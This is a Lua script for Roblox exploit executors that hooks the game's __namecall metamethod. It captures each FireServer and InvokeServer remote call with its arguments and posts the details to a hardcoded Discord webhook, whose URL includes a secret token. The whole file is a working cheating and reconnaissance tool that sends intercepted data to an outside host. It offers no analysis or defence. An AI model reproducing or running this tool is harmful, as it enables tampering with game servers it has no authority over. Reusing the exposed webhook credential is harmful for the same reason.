local HttpService = game:GetService("HttpService")

local webhookURL = "https://discord.com/api/webhooks/1368740509186527323/M1FD3uiD0S7lYr_XP_h7flGHZfdi8b_gYgveK9p904iO1q380Dxd53nY7CucVdUzclpv"

local function universalRequest(options)
    local reqFuncs = {syn and syn.request, http_request, request}
    for _, func in pairs(reqFuncs) do
        if type(func) == "function" then
            return func(options)
        end
    end
    warn("[Remote Spy] No supported request function found.")
end

local sentCache = {}

local function serializeArgs(args)
    local serialized = {}
    for i, v in ipairs(args) do
        local ok, result = pcall(function()
            return HttpService:JSONEncode(v)
        end)
        if ok then
            table.insert(serialized, result)
        else
            table.insert(serialized, "\"[unserializable datatype: " .. typeof(v) .. "]\"")
        end
    end
    return serialized
end

-- Unique key generator for call deduplication
local function generateKey(remote, method, args)
    local data = {
        remote = remote:GetFullName(),
        method = method,
        args = serializeArgs(args)
    }
    return HttpService:JSONEncode(data)
end

-- Send remote call info to Discord webhook
local function sendToDiscord(remote, method, args)
    local serializedArgs = serializeArgs(args)
    local payload = {
        username = "Remote Spy",
        embeds = {{
            title = "📡 Remote Call Detected",
            color = 0x00bfff,
            fields = {
                {
                    name = "🔁 Remote",
                    value = "`" .. remote:GetFullName() .. "`",
                    inline = false
                },
                {
                    name = "📦 Method",
                    value = "`" .. method .. "`",
                    inline = true
                },
                {
                    name = "📨 Arguments",
                    value = "```lua\n" .. table.concat(serializedArgs, ",\n") .. "\n```",
                    inline = false
                }
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    universalRequest({
        Url = webhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    })
end

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    local method = getnamecallmethod()
    if not checkcaller() and (method == "FireServer" or method == "InvokeServer") then
        local args = {...}
        local key = generateKey(self, method, args)
        if not sentCache[key] then
            sentCache[key] = true
            sendToDiscord(self, method, args)
        end
    end
    return oldNamecall(self, ...)
end))

print("[✅ Universal Remote Spy Enabled]")
